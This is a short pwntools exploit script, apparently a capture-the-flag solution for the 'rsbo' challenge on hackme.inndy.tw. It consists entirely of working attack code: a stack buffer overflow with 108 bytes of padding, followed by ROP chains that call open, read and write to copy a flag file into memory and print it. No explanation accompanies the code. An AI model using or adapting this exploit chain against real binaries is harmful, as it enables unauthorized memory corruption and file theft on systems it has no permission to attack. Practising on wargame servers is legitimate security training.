#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
# io = process('./rsbo')
io = remote('hackme.inndy.tw', 7706)
elf = ELF('./rsbo')
readin = 0x8048490
read_plt = elf.plt['read']
write_plt = elf.plt['write']
open_plt = elf.plt['open']
newflag = elf.bss() + 0x100
# padding = '\x00' * (0x60 + 4)
padding = '\x00' * 108
# open file ,return 3
payload = padding + p32(open_plt) + p32(readin) + p32(0x080487D0) + p32(0)
io.send(payload)
# read flag to bss
payload = padding + p32(read_plt) + p32(readin) + p32(3) + p32(newflag) + p32(0x80)
io.send(payload)
# write the flag
payload = padding + p32(write_plt) + p32(0xdeadbeef) + p32(1) + p32(newflag) + p32(0x80)
io.send(payload)

io.interactive()
io.close()

